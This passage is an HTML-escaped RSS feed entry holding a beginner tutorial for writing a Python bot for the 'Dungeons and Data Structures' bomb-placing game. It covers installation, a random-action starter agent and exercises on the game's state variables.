&lt;li&gt;The starter kit for building our bot&lt;/li&gt;
&lt;li&gt;Getting familiar with the AI game environment&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No fancy algorithms or ML just yet. We'll start off simple, and build on our bot with more advanced strategies as part of this series.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#game-overview"&gt;
  &lt;/a&gt;
  Game overview
&lt;/h2&gt;

&lt;p&gt;In Dungeons and Data Structures, your goal is to either be:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The last bot standing, or&lt;/li&gt;
&lt;li&gt;The bot with the most points by the end of the game.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can take away an opponent's HP and earn points by using bombs to destroy wooden and ore (green) blocks. For a full description of the game rules, you can check the &lt;a href="https://www.notion.so/Game-Documentation-9b130e1195fc404cbf1d6ad38dbb4832"&gt;Dungeons and Data Structures Game Documentation&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#getting-started"&gt;
  &lt;/a&gt;
  Getting Started
&lt;/h2&gt;

&lt;p&gt;First, let's install the game environment.&lt;/p&gt;

&lt;p&gt;You can do that by heading over to the &lt;a href="https://github.com/CoderOneHQ/dungeons-and-data-structures"&gt;Dungeons and Data Structures Repo&lt;/a&gt;, and downloading the package &lt;code&gt;coderone-challenge-dungeon-0.1.6.tar.gz&lt;/code&gt; from the &lt;a href="https://github.com/CoderOneHQ/dungeons-and-data-structures/releases/tag/0.1.6"&gt;Releases page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Install it by navigating to the working directory containing the package you just downloaded, and run in your terminal:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install &lt;/span&gt;coderone-challenge-dungeon-0.1.6.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To check that your installation is working, run:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;python &lt;span class="nt"&gt;-m&lt;/span&gt; coderone.dungeon.main &lt;span class="nt"&gt;--interactive&lt;/span&gt; coderone.dungeon.agent
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You should see a window similar to this pop up:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gBwgEQq_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nwng9krh2h9j8h2uw4tn.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gBwgEQq_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nwng9krh2h9j8h2uw4tn.PNG" alt="Game Preview"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Press &lt;code&gt;ENTER&lt;/code&gt; to un-pause the game. You'll be able to play as the knight, using the arrow keys &lt;code&gt;↑&lt;/code&gt; / &lt;code&gt;↓&lt;/code&gt; / &lt;code&gt;←&lt;/code&gt; / &lt;code&gt;→&lt;/code&gt; and &lt;code&gt;SPACE&lt;/code&gt; to place a bomb. You're playing against the default agent provided in the game (which does nothing but stand still). Close the window when you're done.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-our-starter-agent"&gt;
  &lt;/a&gt;
  Setting up our starter agent
&lt;/h2&gt;

&lt;p&gt;To create your own bot that interacts with this game, create a file in your working directory called &lt;code&gt;my_agent.py&lt;/code&gt;. In this file, paste the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Agent&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="s"&gt;'''
        Place any initialization code for your agent here (if any)
        '''&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;next_move&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;game_state&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;player_state&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="s"&gt;'''
        This method is called each time your Agent is required to choose an action
        '''&lt;/span&gt;

        &lt;span class="c1"&gt;###### CODE HERE ######
&lt;/span&gt;
        &lt;span class="c1"&gt;# a list of all the actions your Agent can choose from
&lt;/span&gt;        &lt;span class="n"&gt;actions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;''&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;'u'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;'d'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;'l'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;'r'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;'p'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="c1"&gt;# randomly choosing an action
&lt;/span&gt;        &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;actions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;###### END CODE ######
&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The full template is also available &lt;a href="https://github.com/CoderOneHQ/agent-template/blob/main/my_agent.py"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;At a high level, the job of your &lt;code&gt;my_agent.py&lt;/code&gt; script is to:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Define a class called &lt;code&gt;Agent&lt;/code&gt; containing a method &lt;code&gt;next_move&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Define &lt;code&gt;next_move&lt;/code&gt; such that it can accept game information on each tick, stored in the variables &lt;code&gt;game_state&lt;/code&gt; and &lt;code&gt;player_state&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Have &lt;code&gt;next_move&lt;/code&gt; return an output &lt;code&gt;action&lt;/code&gt; which can take the form of a string representing one of the valid game moves:

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;''&lt;/code&gt;: do nothing&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;u&lt;/code&gt;, &lt;code&gt;d&lt;/code&gt;, &lt;code&gt;l&lt;/code&gt;, &lt;code&gt;r&lt;/code&gt; : up, down, left, right (respectively)&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;p&lt;/code&gt;: place bomb&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This basic starter agent will randomly choose an action from the list of those available.&lt;/p&gt;

&lt;p&gt;Now save your file, and run in your terminal:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;coderone-dungeon &lt;span class="nt"&gt;--watch&lt;/span&gt; &lt;span class="nt"&gt;--interactive&lt;/span&gt; my_agent
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will load up the game, and allow you to play against the bot whose behavior we defined in &lt;code&gt;my_agent.py&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here are some additional details on the earlier command we ran in the terminal:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;--watch&lt;/code&gt; loads the game in a format where you can make live changes to your code.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;--interactive&lt;/code&gt; allows you to play the game as well. &lt;/p&gt;

&lt;p&gt;&lt;code&gt;my_agent&lt;/code&gt; is the name of your bot's Python script that you want to play against.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; you will need at least two agents for the game to start. In the code above, &lt;code&gt;my_agent&lt;/code&gt; is Player 1 (Wizard) and you are Player 2 (Knight). You can also try:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# play your agent against itself&lt;/span&gt;
coderone-dungeon &lt;span class="nt"&gt;--watch&lt;/span&gt; my_agent my_agent 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Feel free to play around with the starter code (e.g. try making a bot that only moves up).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#getting-familiar-with-the-game-environment"&gt;
  &lt;/a&gt;
  Getting familiar with the game Environment
&lt;/h2&gt;

&lt;p&gt;In the previous section, we mentioned that your bot receives two inputs: &lt;code&gt;game_state&lt;/code&gt; and &lt;code&gt;player_state&lt;/code&gt;. These variables contain information about the game environment and your player respectively. They both contain some useful information (a full list is available in the &lt;a href="https://www.notion.so/Game-Documentation-9b130e1195fc404cbf1d6ad38dbb4832"&gt;Game Documentation&lt;/a&gt;), but the most important ones for now are:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;game_state&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;size&lt;/code&gt;: the size of the Game Map in the form (cols, rows) - i.e. (12,10) for a 12x10 map&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;bombs&lt;/code&gt;: a list of all the current positions of bombs placed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;player_state&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;location&lt;/code&gt;: the current location co-ordinates of your player in the form (x,y)&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;ammo&lt;/code&gt;: the amount of ammo you have&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Below are some examples of use cases for these properties, given &lt;code&gt;game_state&lt;/code&gt; and &lt;code&gt;player_state&lt;/code&gt;. Have a go at filling in the code yourself, and checking them against the provided answers.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# get your Agent's current location
&lt;/span&gt;&lt;span class="n"&gt;my_agents_location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;     &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/1aa0a331314799f9e91a935db24faf19"&gt;Link to solution&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# get the number of columns and rows of the Game Map
&lt;/span&gt;&lt;span class="n"&gt;cols&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;     &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;     &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/2fa597c59fc4a5e9bcf4fcdc008aafab"&gt;Link to solution&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# print the location of all the bombs placed on the Game Map
&lt;/span&gt;&lt;span class="n"&gt;list_of_bombs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;   &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;bomb&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;list_of_bombs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s"&gt;"Bomb at x: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt; y: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;         &lt;span class="c1"&gt;### Change 'None'
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/d15013fee456b7cc8572bcb5e8582e86"&gt;Link to solution&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In addition to properties, &lt;code&gt;game_state&lt;/code&gt; also contains some useful methods. The ones we'll use in this tutorial are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;entity_at(location)&lt;/code&gt;: returns the entity/object at the specified location&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;is_in_bounds(location)&lt;/code&gt;: returns True or False depending on whether the specified location is actually within the Game Map (within the 12x10 grid)&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;is_occupied(location)&lt;/code&gt;: returns True or False depending on whether that block is occupied by another object or not&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Some more example use cases are provided below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# return the entity at co-ordinate (1,1)
&lt;/span&gt;&lt;span class="n"&gt;entity_at_1_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;   &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/c21221cdca316e2efd9b046ea75f59c1"&gt;Link to solution&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# is the co-ordinate (12,11) within the boundaries of the game?
&lt;/span&gt;&lt;span class="n"&gt;is_in_bounds&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;   &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/9e8bf88ab16c916eb66431d994f32543"&gt;Link to solution&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# is the co-ordinate (4,2) occupied?
&lt;/span&gt;&lt;span class="n"&gt;is_occupied&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;   &lt;span class="c1"&gt;### CHANGE THIS
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://gist.github.com/joooyzee/64efd70d1eb43b20088d96ae73ce0dd2"&gt;Link to solution&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#next-steps"&gt;
  &lt;/a&gt;
  Next Steps
&lt;/h2&gt;

&lt;p&gt;In the next part of this series, we'll walk through how to implement a very basic bot that can navigate the map and place bombs. You can follow me here on DEV or on &lt;a href="https://joooyz.medium.com/"&gt;Medium&lt;/a&gt; to get notified when Part 2 is out. Feel free to play around with the environment yourself as well in the meantime!&lt;/p&gt;

&lt;p&gt;If you've got any questions or feedback, feel free to let me know in the comments below.&lt;/p&gt;

&lt;p&gt;Thanks for reading 🙌&lt;/p&gt;

&lt;p&gt;P.S. If you're interested in supporting this project, please follow us on &lt;a href="https://www.producthunt.com/upcoming/dungeons-and-data-structures"&gt;Product Hunt&lt;/a&gt;!&lt;/p&gt;

</description>
      <category>python</category>
      <category>programming</category>
      <category>ai</category>
      <category>tutorial</category>
    </item>
  </channel>
</rss>
